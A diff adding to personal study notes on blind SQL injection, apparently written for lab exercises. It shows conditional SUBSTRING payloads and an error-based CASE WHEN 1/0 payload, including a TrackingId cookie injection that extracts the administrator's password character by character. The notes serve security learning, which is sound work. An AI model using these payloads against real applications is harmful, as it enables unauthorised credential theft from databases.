@@ -90,3 +90,16 @@ We can use the behaviour response with brute-forcing techniques to obtain a secr
 xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
 ```
 This query returns whether the first character of the password is larger than m. If it is, then it returns true and the app may behave a certain way.
+
+>[!note]
+>You can use a python script to automate attacks like these
+
+**Variations of these challenges**
+- Error based - error messages may reveal something
+	- Database errors (so we dont depend on if data returned is empty or not)
+		- Example payload: `xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a` (NOTE: different DB's might require different syntax)
+		- You can see this is similar to normal conditional based SQLi, but we exploit `1/0` to cause DB error
+
+username = 'administrator' AND SUBSTRING(password, 1, 1) < '0'
+
+TrackingId=D41rZWESyfuH5SiT' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password, 1, 1) < '0') THEN 1/0 ELSE 'a' END FROM users)='a;
